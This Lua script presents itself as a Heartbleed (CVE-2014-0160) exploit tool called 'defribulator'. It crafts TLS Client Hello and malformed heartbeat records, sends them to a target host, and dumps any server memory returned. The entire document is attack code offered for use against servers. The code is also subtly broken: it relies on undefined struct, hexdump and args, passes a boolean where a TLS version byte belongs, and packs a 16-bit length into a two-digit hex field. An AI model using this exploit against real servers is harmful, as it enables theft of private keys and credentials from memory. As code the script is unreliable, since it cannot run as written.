-- Heartbleed Exploit Lua Script

local socket = require("socket")
local ssl = require("ssl")
local bit32 = require("bit32")

-- Function to convert hexadecimal string to binary string
local function hex2bin(s)
    return (s:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- TLS versions table
local tls_versions = {
    [0x01] = "TLSv1.0",
    [0x02] = "TLSv1.1",
    [0x03] = "TLSv1.2"
}

-- Function to build Client Hello message
local function build_client_hello(tls_ver)
    return hex2bin(string.format(
        "1603%02x00dc010000d803%02x53075c4c2b6cbde929a84897e5ef8a83533d8c005300843d0c0b09160a170806000300ff010000490b0004030001020a00340032000e0d0019000b001800090a0016001708060007001405001200090014001100080006000300ff",
        tls_ver, opts.len))
end

-- Function to build Heartbeat message
local function build_heartbeat(tls_ver)
    return hex2bin(string.format(
        "1803%02x00294141414141414141414141414141414141414141414141414142434445464748494a4b4c4d4e4f4142434445464748494a4b4c4d4e4f4142434445464748494a4b4c4d4e4f4142434445464748494a4b4c4d4e4f4142434445464748494a4b4c4d4e4f",
        tls_ver))
end

-- Function to parse TLS record
local function rcv_tls_record(s)
    local tls_header = s:receive(5)
    if not tls_header then
        print("Unexpected EOF (header)")
        return nil, nil, nil
    end
    local typ, ver, length = struct.unpack('>BHH', tls_header)
    local message = ""
    while #message ~= length do
        message = message .. s:receive(length - #message)
    end
    if not message then
        print("Unexpected EOF (message)")
        return nil, nil, nil
    end
    return typ, ver, message
end

-- Function to analyze heartbeat response
local function hit_hb(s, targ, firstrun, supported)
    s:send(build_heartbeat(supported))
    while true do
        local typ, ver, pay = rcv_tls_record(s)
        if typ == nil then
            print("No heartbeat response received, server likely not vulnerable")
            return ""
        end
        if typ == 24 then
            print("Received heartbeat response...")
            if #pay > 0x29 then
                if firstrun then
                    print(string.format("\nWARNING: %s:%d returned more data than expected - server is vulnerable!", targ, opts.port))
                end
                return pay
            else
                print("Server processed malformed heartbeat, but did not return any extra data.")
            end
        end
        if typ == 21 then
            print("Received alert:")
            return pay
        end
    end
end

-- Function to establish socket connection
local function conn(targ, port)
    local s = socket.tcp()
    s:settimeout(10)
    local success, err = s:connect(targ, port)
    if not success then
        print("Connection Error! " .. err)
        return nil
    end
    return s
end

-- Function to perform heartbleed attack
local function bleed(targ, port)
    local s = conn(targ, port)
    if not s then
        return
    end
    local supported = false
    local firstrun = true

    print(string.format("\n##################################################################"))
    print(string.format("Connecting to: %s:%d, %d times", targ, port, opts.num))

    for x = 1, opts.num do
        if x > 1 then
            firstrun = false
        end

        for num, tlsver in pairs(tls_versions) do
            print(string.format("Sending Client Hello for %s", tlsver))
            s:send(build_client_hello(num))

            while true do
                local typ, ver, message = rcv_tls_record(s)
                if not typ then
                    print(string.format("Server closed connection without sending ServerHello for %s", tlsver))
                    s:close()
                    s = conn(targ, port)
                    break
                end
                if typ == 22 and message:byte(1) == 0x0E then
                    print(string.format("Received Server Hello for %s", tlsver))
                    supported = true
                    break
                end
            end
            if supported then
                break
            end
        end

        if not supported then
            print("\nError! No TLS versions supported!")
            print("##################################################################")
            return
        end

        print("\nSending heartbeat request...")
        local res = hit_hb(s, targ, firstrun, supported)
        if res ~= "" then
            print(string.format("\n%s", hexdump(res)))
        end

        s:close()
        print(string.format("\nPlease wait... connection attempt %d of %d", x, opts.num))
    end

    print(string.format("\n##################################################################\n"))

    s:close()
end

-- Main function
local function main()
    print("\ndefribulator v1.20")
    print("A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)")

    -- Replace with your command-line parsing logic in Lua
    opts = {
        len = 0x4000,  -- Replace with your default payload length
        num = 1,  -- Replace with your default number of attempts
        port = 443  -- Replace with your default port
        -- Add more options as needed
    }

    -- Replace with your command-line argument parsing logic in Lua

    bleed(args[1], opts.port)
end

main()
